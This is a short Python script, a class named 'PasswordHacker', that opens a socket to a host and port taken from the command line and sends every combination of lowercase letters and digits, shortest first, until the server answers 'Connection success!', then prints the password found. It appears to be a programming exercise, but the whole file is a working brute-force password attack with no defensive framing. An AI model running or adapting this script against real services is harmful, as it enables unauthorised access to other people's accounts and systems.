import sys
import socket
import itertools


class PasswordHacker:
    def __init__(self):
        _args = sys.argv
        self.host = _args[1]
        self.port = int(_args[2])
        self.message = None
        self.client_socket = None
        self.server_response = None
        self.eligible_password_chars = list(map(chr, range(97, 123))) + [str(num) for num in range(10)]
        self.main()

    def create_socket(self):
        _address = (self.host, self.port)
        self.client_socket = socket.socket()
        self.client_socket.connect(_address)

    def socket_send_recv(self):
        _binary_message = self.message.encode()
        self.client_socket.send(_binary_message)
        _response = self.client_socket.recv(1024)
        _response = _response.decode()
        return _response

    def close_socket(self):
        self.client_socket.close()

    def get_all_combinations(self):
        for size_ in range(1, len(self.eligible_password_chars)):
            password_generator = itertools.product(self.eligible_password_chars, repeat=size_)
            for trial_password_ in password_generator:
                trial_password_str = ''.join(trial_password_)
                yield trial_password_str

    def main(self):
        self.create_socket()
        password_generator = self.get_all_combinations()
        while self.server_response != "Connection success!":
            self.message = next(password_generator)
            self.server_response = self.socket_send_recv()
        print(self.message)
        self.close_socket()


if __name__ == '__main__':
    PasswordHacker()
